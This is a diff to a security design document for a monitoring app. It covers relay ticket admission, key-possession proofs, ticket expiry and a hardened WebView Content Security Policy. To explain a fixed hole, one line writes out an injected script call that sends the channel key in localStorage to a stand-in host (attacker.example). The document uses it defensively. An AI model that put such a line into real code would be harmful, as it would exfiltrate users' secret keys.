@@ -57,10 +57,28 @@ sent `{type:'hello'}` and passed admission:
 - a **Viewer's** hello must carry a `t` whose `sha256` matches the ticket the
   Monitor registered. No matching ticket ⇒ `close(4008)` (fail-closed on
   Cloudflare; `server.js` honours `REQUIRE_TICKET`, default on);
-- a **Monitor's** hello carries `hashT = sha256(t)`. If a live ticket already
-  exists for the room it must match (a second party cannot overwrite the
-  registration or seize the station slot); otherwise the Monitor registers it.
-  Tickets expire after 24 h and a Monitor re-registers the same one on restart.
+- a **Monitor's** hello carries `hashT = sha256(t)` and `a = sha256("tawny-auth-v1|"
+  + key)` — a second hash of the channel key under a different domain separator,
+  which proves the sender holds the key without revealing it and which the relay
+  cannot derive from the room id. A room claimed with an `a` on file can only be
+  re-keyed by a caller presenting that same `a`; anyone else is refused. The same
+  proof lets a Monitor whose radio dropped reclaim its own room from the dead
+  socket still on the books (the sitting station is closed with 4005) — without
+  it, a caller that merely knows the room id gets 4004 and changes nothing.
+  Rooms registered by builds predating `a` carry none, and there the 4004 on an
+  occupied station slot is the only anti-squat guard.
+- **Ticket lifetime is bounded by two clocks.** A ticket expires 24 h after the
+  last time it was used, *and* 30 days after it was first registered, whichever
+  comes first. The idle clock alone was not enough: a Monitor plugged in and left
+  alone — the product's whole premise — never re-sends its hello, so expiring the
+  ticket out from under it locked every new Handheld out with 4008. The relay
+  therefore rolls the idle clock forward while a Monitor is sitting in the room.
+  That roll-forward used to be unbounded, which meant that for the normal case the
+  ticket never expired at all. It is now capped by the 30-day ceiling, and a
+  Monitor reconnecting re-registers the *same* ticket without restarting that
+  ceiling — only re-pairing the channel (a different `hashT`) starts a new
+  lifetime. Reaching the ceiling means new Handhelds must be re-paired; sessions
+  already connected are untouched, because the ticket is only read at admission.
 - `/turn` credentials are issued only to a caller that presents a ticket valid
   for the room, and are rate-limited and origin-checked. They are short-lived
   (~1 h) but **not** otherwise room-scoped — Cloudflare Realtime TURN issues
@@ -106,9 +124,21 @@ UID boundary, so any other app on the device with `INTERNET` can reach it.
 ## WebView hardening (`MainActivity.showWeb`)
 
 - loads only bundled assets from `http://127.0.0.1:<port>` — no remote web
-  content, and `index.html` carries a strict `<meta http-equiv>` CSP
-  (`default-src 'none'; script-src 'self'; …; connect-src 'self' ws: wss:
-  https:`);
+  content, and a strict CSP is built into the WebView: `default-src 'none';
+  script-src 'self'; …; connect-src 'self' ws://<this-session's-relay>
+  wss://<rendezvous-host> https://<rendezvous-host>`. Every source is an **exact
+  origin**; no scheme-wide source appears. That distinction is the whole point:
+  an earlier policy ended in a blanket `https:`, and the fix for it left a
+  blanket `ws:`, which is the same hole in a different scheme — `ws:` with no
+  host permits `new WebSocket("ws://attacker.example/?k=" + key)` to anywhere on
+  the internet, so the channel key in localStorage was one injected script away
+  from leaving the device. The relay origin is not known at build time, so
+  `AssetHttpServer` is told it (`ws://127.0.0.1:<port>` on the Monitor,
+  `ws://<monitor-lan-ip>:<port>` on a Handheld) before the page is served, and
+  names it verbatim. The page's own `<meta>` CSP carries a placeholder that is
+  substituted with the same list at serve time, so the two cannot drift; served
+  unsubstituted it is an unknown source expression, which matches nothing and
+  fails closed;
 - `onPermissionRequest` grants camera/mic capture only for that host **and**
   only what the OS has already granted the app; `shouldOverrideUrlLoading` /
   `setDownloadListener` pass only `http(s)` to `ACTION_VIEW` (`intent://`,
@@ -209,9 +239,5 @@ after-the-fact alarm, not a gate.
 
 ## Reporting
 
-Email **tawnyapp.radar137@passinbox.com**, which is also the contact address on the Play
-listing. Please do not file public issues for exploitable bugs.
-
-(This previously pointed at "a private security advisory on the repository".
-There is no such repository — the project has no public remote — so that was a
-reporting channel that did not exist.)
+Please report security vulnerabilities responsibly to the contact address listed
+on the Play Store listing. Do not file public issues for exploitable bugs.
